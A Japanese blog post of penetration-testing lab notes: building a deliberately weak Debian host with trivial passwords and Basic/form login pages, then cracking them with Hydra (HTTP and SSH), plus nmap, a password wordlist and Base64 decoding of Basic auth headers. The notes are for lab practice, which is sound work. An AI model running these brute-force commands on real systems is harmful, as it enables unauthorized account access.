---
layout: post
title:  "ペネトレーション"
date:   2025-04-21T00:00:00+09:00
author: Akira Kanai
categories: security
cover:  "/assets/instacode.png"
---

## ログをとる

```
ltelnet(){
    if test ! -d ~/worklog/; then mkdir ~/worklog; fi
    echo "LOGGING START:" ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
    \telnet $1 | tee ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
    echo "LOGGING END:" ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
}
lssh(){
    if test ! -d ~/worklog/; then mkdir ~/worklog; fi
    echo "LOGGING START:" ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
    \ssh $1 | tee ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
    echo "LOGGING END:" ~/worklog/`date +%Y%m%d%H%M%S`_$1.log
}

alias telnet=ltelnet
alias ssh=lssh
```

## 脆弱なホストを用意する

基本的なサービスを提供するホストを生成する。Debian7を基本とする。

### 脆弱なユーザを作る

```
sudo useradd -p user999 -u 1999 user999
sudo passwd user999
su user999
sudo chsh -s /bin/true user999
> ユーザ権限が変更できることを確認
```

### 脆弱なWebページを作る
インストールする:

```
sudo apt-get install apache2 php5
ln -s /etc/apache2/mods-available/userdir.conf /etc/apache2/mods-enabled/userdir.conf
ln -s /etc/apache2/mods-available/userdir.load /etc/apache2/mods-enabled/userdir.load
ln -s /etc/apache2/mods-available/auth_digest.load /etc/apache2/mods-enabled/auth_digest.load
cp -p /etc/apache2/apache2.conf.dpkg-dist /etc/apache2/apache2.conf
cp -p /etc/apache2/envvars.dpkg-dist /etc/apache2/envvars
mkdir ~/public_html
echo '<?php echo "php"; ?>' >  ~/public_html/index.php
cd ~/public_html
mkdir basic
cd basic
htpasswd  -bc htpasswd user999 user999
```

BASIC認証する:

```
cat > /home/kanai/public_html/basic/.htaccess << EOF
AuthUserFile /home/kanai/public_html/basic/htpasswd
AuthGroupFile /dev/null
AuthName "Input ID and Password."
AuthType Basic
require valid-user
EOF
```

### やる
hydra:

```
hydra -L loginname -P password 192.168.13.14 http-get /~kanai/basic/
Hydra v7.5 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
Hydra (http://www.thc.org/thc-hydra) starting at 2013-11-29 14:18:28
[DATA] 9 tasks, 1 server, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking service http-get on port 80
[80][www] host: 192.168.13.14   login: user999   password: user999
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2013-11-29 14:18:29
```

フォーム認証やる:

```
mkdir /home/kanai/public_html/auth
cd /home/kanai/public_html/auth
cat > auth.php << EOF
<html> <head> <title> auth </title> </head> <body>
<form action="./pass.php" method="post"> Username: <input type="text" name="user">
Password: <input type="password" name="pass"> <input type="submit" name="submit" value="auth">
</form>
</body> </html>
EOF

cat > pass.php << EOF
<html> <head> <title>auth</title> </head> <body>
<?php
$user = $_POST['user']; $pass = $_POST['pass']; $submit = $_POST['submit'];
if($submit == "auth")
  if($user == "user999" && $pass == "user999") print "HIMITSU";
  else print "Invalid username or password";
else print "nothing";
?> </body></html>
EOF
```

これで、user999:user999でHIMITSUとでる。それ以外はInvalidとかでる。
これをシナリオにする:

```
hydra 192.168.13.14 http-form-post "/~kanai/auth/pass.php:submit=auth&user=^USER^&pass=^PASS^:Invalid" -L loginname -P password
```

うまくいかないときは、-dつけてデバッグでパケットダンプさせる。

### 脆弱なFTP
インストール:

```
sudo apt-get install vsftpd
sudo vi /etc/vsftpd.conf
local_enable=YES
sudo service vsftpd restart
```



### その他
SSH:

```
hydra -L loginname -P password 192.168.13.14 ssh
```


## 環境構築に関して

基本的にKali Linuxを用いる。VMWareあるいはVirtualBoxにインストール可能。ネットワークインタフェースはBridgeとすること。

sshが入っていないと使いにくいのでいれる:

```
apt-get install ssh
service ssh restart
```

## OSを特定する
zenmapが良いと思う

nmap:

```
nmap -O
```


### nesusいれる

http://www.tenable.com/products/nessus/select-your-operating-system

Debian 6.0 (64 bits) を落としてdownload

## Hydra

## ブルートフォース
ブルートフォースアタックについて述べる。

ユーザが用いるパスワードはおおよそにおいて、以下に分類される。

* キーワードを用いる: 辞書に用いるキーワードをそのまま用いる。あるいは多少の変更を加える。
* キーワードの前後に特殊な文字列を置く: 上記のキーワードに加えて、特定の文字列を追加する。たとえば、1や!などを追加する。あるいは、誕生日を追加する等が考えられる。
* 乱数: これはいくつかのパターンが考えられる。
  * 乱数で生成したキーワードを使いまわす


### passwdリスト

http://download.openwall.net/pub/wordlists/passwords/password.gz

## Basic認証の危険性

```
Authorization: Basic dXNlcjpwYXNz
```

があったとすると、

```
echo -n 'user:pass' | perl -MMIME::Base64 -ne 'print encode_base64($_)'
dXNlcjpwYXNz
こうやってつくられているんで、
echo -n 'dXNlcjpwYXNz' | perl -MMIME::Base64 -ne 'print decode_base64($_)."\n"'
user:pass
```

ということ。

## appgoat

他のホストからアクセス可能にする

```
start /MIN %APACHE_HOME%\bin\httpd.exe -e info -d %APACHE_HOME% -c "DocumentRoot %DOCUMENT_ROOT%" -c "<Directory />" -c "Options FollowSymLinks" -c "Options +Includes" -c "AllowOverride None" -c "Order deny,allow" -c "Deny from all" -c "Allow from %LOCALHOST_NAMES%" -c "</Directory>" -c "<Directory %CGI_DIR%>" -c "AllowOverride All" -c "Options ExecCGI" -c "Order allow,deny" -c "Allow from all" -c "</Directory>" -c "php_value include_path %PHP_INCLUDE_PATH%" -c "php_value session.save_path %PHP_SESSION_SAVE_PATH%"
```

を

```
start /MIN %APACHE_HOME%\bin\httpd.exe -e info -d %APACHE_HOME% -c "DocumentRoot %DOCUMENT_ROOT%" -c "<Directory />" -c "Options FollowSymLinks" -c "Options +Includes" -c "AllowOverride None" -c "Order deny,allow" -c "Deny from 1.1.1.1" -c "Allow from all" -c "</Directory>" -c "<Directory %CGI_DIR%>" -c "AllowOverride All" -c "Options ExecCGI" -c "Order allow,deny" -c "Allow from all" -c "</Directory>" -c "php_value include_path %PHP_INCLUDE_PATH%" -c "php_value session.save_path %PHP_SESSION_SAVE_PATH%"
```
